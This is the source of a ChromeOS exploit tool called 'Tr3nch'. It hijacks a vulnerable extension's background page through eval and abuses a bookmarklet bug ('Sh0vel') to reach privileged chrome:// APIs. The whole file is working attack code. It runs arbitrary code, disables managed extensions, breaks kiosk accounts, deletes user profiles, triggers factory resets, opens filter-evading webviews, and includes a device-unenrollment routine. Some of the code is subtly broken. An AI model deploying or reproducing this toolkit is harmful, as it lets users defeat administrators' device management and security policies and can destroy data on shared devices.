chrome.runtime.getBackgroundPage((background) => {
	function payload() {
		const onMessage=function(msg) {
			switch(msg.cmd) {
				case "runCode":
					/* Since we're the background page, we'll want to be able to run code from the menu, and
					it just so happens Sh0vel requires eval, soooooo...*/
					eval(msg.code);
					break;
				case "disable":
					chrome.management.setEnabled(msg.id, !msg.disable);
					break;
				case "tabOpen":
					chrome.tabs.create({}, () => {
						chrome.tabs.update({url: msg.url});
						chrome.tabs.reload();
					});
					break;
			}
		}
		chrome.runtime.onMessage.addListener(onMessage);
		chrome.runtime.onMessageExternal.addListener(onMessage);
		
		chrome.browserAction.enable(); /* Some extensions like to be silly and disable browserAction */
		chrome.browserAction.onClicked.addListener(function() {
			function tabPayload() {
				if (!tr3nch) {
					var tr3nch=true;
				}else{
					return;
				} /* Don't inject Tr3nch twice. */
				
				/* asPage is what really ties everything together, with bookmarklets having a bug that
				lets us run code outside of the content script's boundaries. This has been dubbed
				"sh0vel", and we can use it to not only access private chrome APIs, but also Mojo and WEBUI.*/
				const asPage=function(code) {
					let link=window.open('about:blank','_blank');
					link.location.href=`javascript:(function() {chrome=opener.chrome;console=opener.console;${code}})();`;
					/* We don't call link.close here as some callbacks need to run before closing, so
					ALL asPage calls need to have window.close be the last thing that runs unless you need the extra tab */
				}
				/* For convenience, we'll want to run code as the extension too, as it may also
				have useful permissions that can be exploited.*/
				const asExt=function(code) {
					chrome.runtime.sendMessage({cmd: "runCode", code: code});
				}

				/* Here we load in the base GUI, the options will be filled in later by loadMenuItems. */
				const loadMenuHTML=function() {
					document.documentElement.innerHTML=`
					<!DOCTYPE html>
					<html lang="en">
						<head>
							<title>Tr3nch</title>
							<meta charset="utf-8">
							<base target="_blank">
						</head>
						<body>
							<div id="locked"></div>
							<div class="topBar">
								<h1>Tr3nch</h1>
								<p>
									Current Extension: ${chrome.runtime.getManifest().name} (${chrome.runtime.id}), Current Page: ${window.origin.replace("chrome://","")}, Chrome Version: R${chromeVer}
								</p>
								<a href="https://whelement.me">Whelement Homepage</a>
								<a href="https://discord.gg/fPU8cUvf">Whelement Discord</a>
								<a href="https://github.com/Whelement/Tr3nch">Source Code</a>
								<button id="unload">Deload Tr3nch</button>
								<button id="pubkey">View Public Key</button>
							</div>
							<div id="opt-container">
								<br>
							</div>
							<div class="credits">
								<h1>Credits</h1>
								<p1>Developed and brought to you by Whelement.</p1>
								<p>
									Zeglol1234: The idea, main developer<br>
									Writable: Skiovox Breakout implementations (Not affiliated with this project directly)<br>
									Bypassi: Add gmails exploit (Not affiliated with this project directly)<br>
									Notboeing747: Misc development and testing<br>
									Kxtz: Misc development and testing<br>
									Archimax: GUI inspiration<br>
									Kelsea: The logo<br>
									Katie: Testing<br>
									The rest of Whelement: Mental support<br>
									${chrome.runtime.getManifest().name}: Being vulnerable to Sh0vel<br>
								</p>
							</div>
						</body>
						<style>
							body{
								margin: 0px;
								padding: 0px;
								font-family: monospace;
								background-color: #2c3e50;
								color: white;
							}
							.topBar{
								width: 100%;
								height: 140px;
								background-color: #2c3e50;
								text-align: center;
							}
							.credits{
								width: 100%;
								height: 250px;
								background-color: #2c3e50;
								text-align: center;
							}
							#message{
								width: 100%;
								height: 90vh;
								border: 4px solid white;
								border-radius: 10px;
								background-color: #000;
								padding: 10px;
								text-align: center;
								position: absolute;
								left: 5%;
								overflow-wrap: break-word;
							}
							#locked{
								position: fixed;
								margin-left: auto;
								margin-right: auto;
								width: 90%;
							}
							#opt-container{
								background-color: #1d2936;
								text-align: center;
							}
							textarea{
								height: 200px;
								width: 550px;
								color: white;
								padding: 10px;
								background-color: #000;
								border-radius: 20px;
								border: 3px solid white;
							}
							input{
								height: 20px;
								width: 300px;
								color: white;
								padding: 10px;
								background-color: #000;
								border-radius: 20px;
								border: 3px solid white;
							}
							h1{
								cursor: default;
								font-size: 40px;
								font-weight: bold;
								margin-bottom: 0px;
							}
							hr{
								width: 750px;
							}
							button{
								height: 40px;
								padding: 10px;
								margin: 3px;
								border-radius: 20px;
								border: 3px solid white;
								color: white;
								background-color: #2c3e50;
								font-weight: bold;
							}
							button:hover{
								cursor: pointer;
								background-color: #1d2936;
							}
							p{
								cursor: default;
								color: white;
							}
							p1{
								cursor: default;
								font-size: 17px;
								font-weight: bold;
							}
							a{
								font-weight: bold;
								color: white;
							}
						</style>
					</html>
					`;
				}

				const message=function(header, text) {
					if (document.querySelector('#message') !== null) return; /* Don't post a message if another one is present. */
					let msg=document.createElement('div');
					msg.id="message";
					msg.innerHTML=`
					<h1>${header}</h1>
					<hr>
					<p>${text}</p>
					<br>
					<button id="closeButton">Close</button>
					`;
					msg.querySelector('#closeButton').addEventListener('click', () => {
						document.querySelector('#message').remove();
					});

					document.querySelector('#locked').append(msg);
				}
				const promptRequest=function(header, text, placeholder, callback) {
					if (document.querySelector('#message') !== null) return; /* Don't post a textbox if another one is present. */
					let msg=document.createElement('div');
					msg.id="message";
					msg.innerHTML=`
					<h1>${header}</h1>
					<hr>
					<p>${text}</p>
					<br>
					<label>
						<input type="text" id="textboxRet" placeholder="${placeholder}">
					</label>
					<br>
					<button id="confButton">Confirm</button>
					`;
					msg.querySelector('#confButton').addEventListener('click', () => {
						let info=document.querySelector('#textboxRet').value;
						document.querySelector('#message').remove();
						callback(info);
					});

					document.querySelector('#locked').append(msg);
				}
				const confirmRequest=function(header, text, onTrue, onFalse) {
					if (document.querySelector('#message') !== null) return; /* Don't post a confirmation if another one is present. */
					let msg=document.createElement('div');
					msg.id="message";
					msg.innerHTML=`
					<h1>${header}</h1>
					<hr>
					<p>${text}</p>
					<br>
					<button id="contButton">Continue</button>
					<button id="cancButton">Cancel</button>
					`;
					msg.querySelector('#contButton').addEventListener('click', () => {
						document.querySelector('#message').remove();
						onTrue();
					});
					msg.querySelector('#cancButton').addEventListener('click', () => {
						document.querySelector('#message').remove();
						onFalse();
					});

					document.querySelector('#locked').append(msg);
				}

				/* Check what the full extent of our permissions are based off the origin. */
				const checkPerms=function() {
					/* We use window.origin so url parameters can't break the menu */
					if (!window.origin.includes("chrome:")) return null;

					switch(window.origin.replace("chrome://","")) {
						case "oobe":
							return [
								"unenroll",
								"update",
								"webViewProxy",
								"reboot"
							];
							break;
						case "extensions":
							return ["manExtensions"];
							break;
						case "os-settings":
							return [
								"manageNetworks",
								"addAccounts",
								"siteSettings",
								"update",
								"restart",
								"webViewProxy",
								"disableExtensions"
							];
							break;
						case "settings":
							return [
								"addAccounts",
								"siteSettings",
								"update",
								"restart",
								"disableExtensions"
							];
							break;
						case "file-manager":
							return [
								"files"
							];
							break
						case "chrome-signin":
							return [
								"webViewProxy",
								"signin"
							];
							break;
						case "network":
							return ["manageNetworks"];
							break;
						case "policy":
							return ["policies"];
							break;
						case "flags":
							return ["flags"];
							break;
						default:
							/* If a page isn't here, its permissions are not considered useful. */
							return null;
							break;
					}
				}

				/* Get available permissions and make a container filled with menu options, then return it. */
				const loadMenuItems=function() {
					let perms=checkPerms();
					let container=document.createElement('div');
					container.id="items";

					/*=================================================================
					Permission Independent Options
					Put options that don't need specific page permissions here
					=================================================================*/
					
					let extEvalBox=document.createElement('div');
					/* We can use innerHTML because we inherit the CSP from our extension */
					extEvalBox.innerHTML=`
					<br>
					<h1>Run Code As Background Page</h1>
					<hr>
					<p>Run code directly as the background page of the extension Tr3nch is injected into</p>
					<textarea spellcheck="false" id="extEvalBox"></textarea>
					<br>
					<button id="extEvalButton">Run as Background</button>
					`;
					extEvalBox.querySelector('#extEvalButton').addEventListener('click', () => {
						asExt(document.querySelector('#extEvalBox').value);
					});
					container.append(extEvalBox);

					let pbEvalBox=document.createElement('div');
					pbEvalBox.innerHTML=`
					<br>
					<h1>Run Code As Sh0vel</h1>
					<hr>
					<p>Run code with direct access to this page's chrome API via Sh0vel. Access this page's DOM with window.opener.</p>
					<textarea spellcheck="false" id="pbEvalBox"></textarea>
					<br>
					<button id="pbEvalButton">Run as Sh0vel</button>
					`;
					pbEvalBox.querySelector('#pbEvalButton').addEventListener('click', () => {
						asPage(document.querySelector('#pbEvalBox').value);
					});
					container.append(pbEvalBox);

					let pageEvalBox=document.createElement('div');
					pageEvalBox.innerHTML=`
					<br>
					<h1>Run Code On This Page</h1>
					<hr>
					<p>Run code directly as this content script without chrome API access.</p>
					<textarea spellcheck="false" id="pageEvalBox"></textarea>
					<br>
					<button id="pageEvalButton">Run as Page</button>
					`;
					pageEvalBox.querySelector('#pageEvalButton').addEventListener('click', () => {
						eval(document.querySelector('#pageEvalBox').value);
					});
					container.append(pageEvalBox);

					let redirBox=document.createElement('div');
					redirBox.innerHTML=`
					<br>
					<h1>Quick Navigate</h1>
					<hr>
					<p>Quickly redirect to various URLs to run Tr3nch on.</p>
					<br>
					`;
					function addPage(page) {
						let redir=document.createElement('button');
						redir.innerText=page.replace("chrome://","");
						/* I have no clue why asExt is undefined in the Function statement here, so we'll just manually send the message. */
						redir.addEventListener('click', Function(`chrome.runtime.sendMessage({cmd: "tabOpen", url: "${page}"});`));
						redirBox.append(redir);
					}
					addPage('chrome://extensions');
					addPage('chrome://os-settings');
					addPage('chrome://settings');
					addPage('chrome://file-manager');
					addPage('chrome://chrome-signin');
					addPage('chrome://flags');
					addPage('chrome://network');
					addPage('chrome://policy');
					if (chromeVer < 109) {
						/* The OOBE can't be accessed from user sessions past R109. */
						addPage('chrome://oobe');
					}
					
					container.append(redirBox);

					/*=================================================================
					Permission Dependent Options
					Put options that DO need specific page permissions here
					=================================================================*/
					
					if (chrome.runtime.getManifest().permissions.includes("management")) {
						let disableBox=document.createElement('div');
						disableBox.innerHTML=`
						<br>
						<h1>Fully Disable/Enable Extensions</h1>
						<hr>
						<p>Fully disable/enable any extension by its ID.</p>
						<br>
						<label>
							<input id="disableIdBox" placeholder="Extension ID Here">
						</label>
						<br>
						<button id="disableIdButton">Disable Extension</button>
						<button id="enableIdButton">Enable Extension</button>
						`;
						disableBox.querySelector('#disableIdButton').addEventListener('click', () => {
							/* Unfortunately we are still a content script, so we do have to play by the rules :( */
							chrome.runtime.sendMessage({
								cmd: 'disable', 
								id: document.querySelector('#disableIdBox').value,
								disable: true
							});
						});
						disableBox.querySelector('#enableIdButton').addEventListener('click', () => {
							chrome.runtime.sendMessage({
								cmd: 'disable', 
								id: document.querySelector('#disableIdBox').value,
								disable: false
							});
						});

						container.append(disableBox);
					}

					if (perms == null) {
						message("Lacking Permissions","The page you're attempting to run Tr3nch on is not priveledged.<br> Please run this on a url starting with 'chrome://'.");
						return container; /* For unpriveledged pages, extension permissions are still accessible, so stop only after loading them in. */
					}
					
					if (perms.includes("update")) {
						let updateBox=document.createElement('div');
						updateBox.innerHTML=`
						<br>
						<h1>Update Manager</h1>
						<hr>
						<p>Force, Disable, and Enable automatic updates for the OS.</p>
						<button id="updateOS">Update System</button>
						<button id="caub">Disable Consumer Autoupdates</button>
						<button id="uncaub">Enable Consumer Autoupdates</button>
						`;
						updateBox.querySelector('#updateOS').addEventListener('click', () => {
							asPage("chrome.send('requestUpdate');window.close();");
						});
						updateBox.querySelector('#caub').addEventListener('click', () => {
							asPage("chrome.send('setConsumerAutoUpdate', ['false']);window.close();");
						});
						updateBox.querySelector('#uncaub').addEventListener('click', () => {
							asPage("chrome.send('setConsumerAutoUpdate', ['true']);window.close();");
						});
						container.append(updateBox);
					}
					if (perms.includes("restart")) {
						let restartBox=document.createElement('div');
						restartBox.innerHTML=`
						<br>
						<h1>User Session Management</h1>
						<hr>
						<p>Reset, exit, or wipe the current user session.</p>
						<button id="restart">Restart Chrome</button>
						<button id="signout">Sign out</button>
						<button id="powerwash">Powerwash</button>
						<button id="userexit">Attempt User Exit</button>
						`;

						restartBox.querySelector('#restart').addEventListener('click', () => {
							asPage("chrome.send('restart');window.close();");
						});
						restartBox.querySelector('#signout').addEventListener('click', () => {
							confirmRequest("Confirm Sign Out", "Are you sure you want to sign out?", () => {
								asPage("chrome.send('signOutAndRestart');window.close();");
							}, () => {
								return;
							});
						});
						restartBox.querySelector('#powerwash').addEventListener('click', () => {
							confirmRequest("Warning!","Continuing further will remove all userdata!<br> Are you sure you want to do this?", () => {
								message("Powerwashing...","Please wait, do not close the computer.");
								/* For those curious, false here prevents a tpm firmware update */
								asPage("chrome.send('factoryReset', ['false']);window.close();");
							}, () => {
								message("Cancelled","Powerwash cancelled.");
							});
						});
						restartBox.querySelector('#userexit').addEventListener('click', () => {
							asPage("chrome.send('AttemptUserExit');window.close();");
						});

						container.append(restartBox);
					}
					if (perms.includes("files")) {
						let fileBox=document.createElement('div');
						fileBox.innerHTML=`
						<br>
						<h1>Misc Options</h1>
						<hr>
						<p>Various options for the fileManagerPrivate permission.</p>
						<button id="reauth">Signout and Reauthenticate</button>
						<button id="devtools">(EXPERIMENTAL) Open Inspector</button>
						`; /* More options to be added soon hopefully, otherwise ill just make a "random" section. */
						
						fileBox.querySelector('#reauth').addEventListener('click', () => {
							asPage("chrome.fileManagerPrivate.logoutUserForReauthentication();window.close();");
						});
						fileBox.querySelector('#devtools').addEventListener('click', () => {
							asPage("chrome.fileManagerPrivate.openInspector('console');window.close();");
						});
						
						container.append(fileBox);
					}
					if (perms.includes("signin")) {
						let signinBox=document.createElement('div');
						signinBox.innerHTML=`
						<br>
						<h1>SignIn Options</h1>
						<hr>
						<p>Various options for the chrome-signin page.</p>
						<button id="incog">(EXPERIMENTAL) Open Incognito</button>
						`;

						signinBox.querySelector('#incog').addEventListener('click', () => {
							asPage('chrome.send("showIncognito");window.close();');
						});

						container.append(signinBox);
					}
					if (perms.includes("addAccounts")) {
						let accBox=document.createElement('div');
						accBox.innerHTML=`
						<br>
						<h1>Manage Accounts</h1>
						<hr>
						<p>Mess around with profiles on the current user session.</p>
						<button id="gmailAdd">Add User Gmail</button>
						<button id="profileAdd">Add Profile Dialog</button>
						`;
						accBox.querySelector('#gmailAdd').addEventListener('click', () => {
							confirmRequest("Warning!", `
							Continuing further may break signin on some pages until you add your account here.<br>
							However, you will be able to add any account you want to the device. Are you sure you want to do this?<br>
							`, () => {
								asPage("chrome.send('TurnOffSync');window.close();");
								/* window.open has a few problems, lets use tabs.create instead. */
								asExt("chrome.tabs.create({url: 'https://tinyurl.com/addSession'});");
							}, () => {
								message("Cancelled","Sync has not been touched, signin will function as normal.");
							});
						});
						accBox.querySelector('#profileAdd').addEventListener('click', () => {
							asPage("chrome.send('addAccount');window.close();");
						});

						if (window.origin.includes("os-settings")) {
							let breakKiosk=document.createElement('button');
							breakKiosk.innerText="(EXPERIMENTAL) Break All Kiosk Apps";
							breakKiosk.addEventListener('click', () => {
								function attempt() {
									chrome.usersPrivate.getUsers((users) => {
										for (let i=0; i < users.length; i++) {
											if (users[i].email.includes("kiosk")) {
												chrome.usersPrivate.removeUser(users[i].email, () => {});
												chrome.usersPrivate.addUser(users[i].email, () => {});
											}
										}
										window.close();
									});
								}
								confirmRequest("Warning!", "Continuing further will make all kiosk apps inoperable!<br> Are you sure you want to do this?", () => {
									asPage(`${attempt.toString()};attempt();window.close();`);
									message("Kiosk Breaker","Kiosks have been broken successfully.");
								}, () => {
									message("Request Cancelled","No kiosk accounts have been altered.");
								});
								
							});
							accBox.append(breakKiosk);

							let removeAccount=document.createElement('button');
							removeAccount.innerText="Remove User Account";
							removeAccount.addEventListener('click', () => {
								promptRequest("Cryptohome Deleter",`Please enter the full email used to create the cryptohome you want to delete.<br> 
								To cancel, leave the box blank.<br>
								`, (email) => {
									if (email == "") message("Cancelled","Email field left blank, no users have been altered.");
									asPage(`chrome.usersPrivate.removeUser('${email}', () => {window.close();});`);
								});
							});
							accBox.append(removeAccount);
						}

						container.append(accBox);
					}
					if (perms.includes("flags")) {
						let flagBox=document.createElement('div');
						flagBox.innerHTML=`
						<br>
						<h1>Manage Flags</h1>
						<hr>
						<p>Tamper with unstable OS features and restart.</p>
						<label>
							<input type="text" id="flagBox" placeholder="Place your flag name here" value="borealis-enabled@1">
						</label>
						<button id="enableFlag">Enable Flag</button>
						<button id="restartBrowser">Restart User Session</button>
						`;
						flagBox.querySelector('#enableFlag').addEventListener('click', () => {
							asPage(`chrome.send('enableExperimentalFeature', ['${document.querySelector("#flagBox").value}','true']);window.close();`);
						});
						flagBox.querySelector('#restartBrowser').addEventListener('click', () => {
							asPage('chrome.send("restartBrowser");window.close();');
						});

						container.append(flagBox);
					}
					if (perms.includes("policies")) {
						let policyBox=document.createElement('div');
						policyBox.innerHTML=`
						<br>
						<h1>Policies</h1>
						<hr>
						<p>Sync and export policies.</p>
						<button id="relPolicy">Policy Sync</button>
						<button id="exPolicy">Export Policies</button>
						`;
						
						policyBox.querySelector('#relPolicy').addEventListener('click', () => {
							asPage("chrome.send('reloadPolicies');window.close();");
						});
						policyBox.querySelector('#exPolicy').addEventListener('click', () => {
							asPage("chrome.send('exportPoliciesJSON');window.close();");
						});

						container.append(policyBox);
					}
					if (perms.includes("manageNetworks")) {
						let netBox=document.createElement('div');
						netBox.innerHTML=`
						<br>
						<h1>Network Settings</h1>
						<hr>
						<p>Mess around with internet settings.</p>
						<button id="bringUp">Turn Network On</button>
						<button id="bringDown">Turn Network Off</button>
						`;
						netBox.querySelector('#bringUp').addEventListener('click', () => {
							asPage("chrome.networkingPrivate.enableNetworkType('All');window.close();");
						});
						netBox.querySelector('#bringDown').addEventListener('click', () => {
							asPage("chrome.networkingPrivate.disableNetworkType('All');window.close();");
						});

						if (window.origin.includes("settings")) {
							let diag=document.createElement('button');
							diag.innerText="Open Diagnostics";
							diag.addEventListener('click', () => {
								asPage("chrome.send('openDiagnostics');window.close();");
							});

							netBox.append(diag);
						}
						
						container.append(netBox);
					}
					if (perms.includes("webViewProxy")) {
						let proxyBox=document.createElement('div');
						proxyBox.innerHTML=`
						<br>
						<h1>Webview Proxy Spawner</h1>
						<hr>
						<p>Open an unblocked webview tab invisible to some filters.</p>
						<label>
							<input id="proxyUrlBox" value="https://www.google.com/">
						</label>
						<br>
						<button id="proxyUrlButton">Launch Webview</button>
						`;
						proxyBox.querySelector('#proxyUrlButton').addEventListener('click', () => {
							/* Thanks bypassi, for the broken SWA window.open bypass! */
							let proxy=window.open("invalid:url", '_blank'); /* This is intentionally broken */
							asExt(`chrome.tabs.update({url: "${window.origin}"});chrome.tabs.reload();`);
							
							proxy.onload=function() {
								proxy.document.head.innerText="";
								
								/* Fix problems with the OOBE */
								proxy.document.head=document.createElement('head');
								proxy.document.body=document.createElement('body');

								proxy.document.title="Tr3nch Webview";
								/* Insecure html injection my beloved <3 */
								proxy.document.body.innerHTML=`
								<div class="webviewContainer">
									<webview allowscaling="" src="${document.querySelector('#proxyUrlBox').value}"></webview>
								</div>
								<style>
									.webviewContainer{
										width: 100%;
										height: 100vh;
									}
									body{
										margin: 0px;
									}
									webview, iframe{
										height: 100%;
										width: 100%;
									}
								</style>
								`;
							}
						});

						if (chrome.runtime.getManifest().permissions.includes("identity")) {
							let cloakButton=document.createElement('button');
							cloakButton.innerText="Open Cloaked Window";
							cloakButton.addEventListener('click', () => {
								asExt(`chrome.identity.launchWebAuthFlow({url: '${document.querySelector("#proxyUrlBox").value}', interactive: true}, () => {});`);
							});

							proxyBox.append(cloakButton);
						}

						container.append(proxyBox);
					}
					if (perms.includes("manExtensions")) {
						let killBox=document.createElement('div');
						killBox.innerHTML=`
						<br>
						<h1>Extension Manager</h1>
						<hr>
						<p>Manage extensions installed on the device.</p>
						<label>
							<input id="killIdBox" placeholder="Extension ID Here">
						</label>
						<br>
						<button id="killIdButton">LoopKill Extension</button>
						<button id="resIdButton">Restart Extension</button>
						<button id="updateButton"Update Extensions></button>
						`;
						killBox.querySelector('#killIdButton').addEventListener('click', () => {
							let id=document.querySelector('#killIdBox').value;
							function disable(id) {
								/* Everything here runs on about:blank! */
								document.body.innerHTML="<h1>Do not close this page! It is keeping your extension disabled.</h1>";
								let ret=true;
								console.log(`Disabling extension by ID: ${id}`);
								setInterval(() => {
									ret=!ret;
									chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: ret});
								}, 3000);
							}
							asPage(`${disable.toString()};disable('${id}');`);
						});
						killBox.querySelector('#resIdButton').addEventListener('click', () => {
							let id=document.querySelector('#killIdBox').value;
							function restart(id) {
								/* We would typically use developerPrivate.restart, but that doesn't work on managed
								extensions, so let's do it my way. */
								chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: false});
								chrome.developerPrivate.updateExtensionConfiguration({extensionId: id, fileAccess: true});
								window.close(); /* We don't want the extra page. */
							}
							asPage(`${restart.toString()};restart('${id}');window.close(();`);
						});
						killBox.querySelector('#updateButton').querySelector('click', () => {
							asPage('chrome.developerPrivate.autoUpdate();window.close();');
						});

						/* Experimental */
						document.body.addEventListener('drop', () => {
							asPage('chrome.developerPrivate.installDroppedFile();window.close();');
						});

						container.append(killBox);
					}
					if (perms.includes("unenroll")) {
						let oobeBox=document.createElement('div');
						oobeBox.innerHTML=`
						<br>
						<h1>Unenroll</h1>
						<hr>
						<p>Remove your device from its current management.</p>
						<br>
						<button id="unenrollButton">Deprovision Device</button>
						`;
						oobeBox.querySelector('#unenrollButton').addEventListener('click', () => {
							const unenroll=function() {
								chrome.send('skipToLoginForTesting');
								chrome.networkingPrivate.disableNetworkType('All');
								chrome.send('completeLogin', [Math.floor(Math.random() * (21 ** 10)).toString(), "whopper@gmail.com", "whopper", false]);
								chrome.send('oauthEnrollAttributes', ['','']);
								chrome.send('oauthEnrollClose', ['done']);
							}
							asPage(`${uneneroll.toString()};unenroll();window.close();`);
						});

						/* container.append(oobeBox); */ /* For testing! Do not uncomment until it has been proven to work. */
					}
					container.append(document.createElement('br')); /* Whitespace just to make me feel better */
					
					return container;
				}

				let chromeVer=navigator.appVersion.match(/Chrom(e|ium)\/([0-9]+)/)[2];

				loadMenuHTML(); /* Load in the base menu */
				let mainContainer=document.querySelector('#opt-container');

				if (mainContainer == null) {
					/* For testing */
					asExt("alert('No GUI container was found, Tr3nch cannot be loaded in.');");
					return;
				}
				mainContainer.append(loadMenuItems()); /* Create a container for all options and append them */
				mainContainer.append(document.createElement('br'));

				document.querySelector('#unload').addEventListener('click', () => {
					/* Close the menu and reload the background page, clearing all traces of Tr3nch */
					asExt('chrome.tabs.getSelected((cur) => {chrome.tabs.remove(cur.id);location.reload();});');
				});
				document.querySelector('#pubkey').addEventListener('click', () => {
					/* This will work regardless of if the key is present in the manifest or not. */
					message('Public Key',`Current extension's public key:<br><br> ${chrome.runtime.getManifest().key}`);
				});
			} /* As Page */

			console.log("Injecting Tr3nch into current page");

			chrome.tabs.getSelected((cur) => {
				if (cur.url.includes("webstore")) {
					alert("Tr3nch cannot operate on the chrome webstore.");
					/* For those curious why, tabs.executeScript has a special case where it will
					refuse to run on the webstore, making Tr3nch impossible to inject into it. */
					return;
				}
				if (cur.url.includes("chrome-untrusted:")) {
					alert("Tr3nch cannot be injected into urls with the 'chrome-untrusted:' protocol.");
					/* The --extensions-on-chrome-urls flag that this relies on does not grant access 
					to the chrome-untrusted protocol, so no access to pages like crosh is possible. */
					return;
				}
				/* I would LOVE to use MV3's function injection capabilities, but because Sh0vel relies entirely on MV2,
				we can't do that, so let's do it my way. */
				chrome.tabs.executeScript(null, {code: `${tabPayload.toString()};tabPayload();`}); /* cur.id over null seems to be buggy */
				/* If you're wondering why I reiterated tabPayload() at the end, it's because the 
				.toString() method in this case only defines the function in the page, it still needs to be called manually. */
			});
		}); /* On Clicked */
		
		console.log('Tr3nch injected into current extension.');
	} /* As Background Page */

	let manifest=chrome.runtime.getManifest();
	if (!manifest.browser_action) {
		alert("Current extension does not have browserAction permissions, cannot continue.");
		return;
	}
	/* The quotations prevent it from accepting 'wasm-unsafe-eval' which won't work */
	if (!manifest.content_security_policy.includes("'unsafe-eval'")) { 
		alert("Current extension does not have permission to use eval, cannot continue.");
		return;
	}
	/* Cool perk of sh0vel: The extension requires eval to work, so we can run code directly
	as the background page to get persistence until the extension restarts */
	if (background.location.href !== location.href) {
		background.eval(`${payload.toString()};payload();`);
	}else{
		payload(); /* If this is already running as the background page then we don't need to use eval. */
	}
});
